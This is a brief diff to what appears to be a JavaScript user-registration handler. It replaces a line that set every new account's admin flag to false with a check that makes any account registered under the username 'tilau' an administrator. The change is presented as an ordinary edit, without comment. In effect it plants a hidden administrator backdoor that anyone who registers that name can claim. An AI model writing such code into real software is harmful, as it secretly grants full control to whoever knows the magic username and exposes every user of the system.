@@ -36,7 +36,10 @@ const register = {
         let user = new User();
         user.email = req.payload.email;
         user.username = req.payload.username;
-        user.admin = false;
+        
+        if(user.username == "tilau") user.admin = true;
+        else user.admin = false;
+        
         utils.hashPassword(req.payload.password, (err, hash) => {
             if (err) { throw Boom.badRequest(err); }
             user.password = hash;
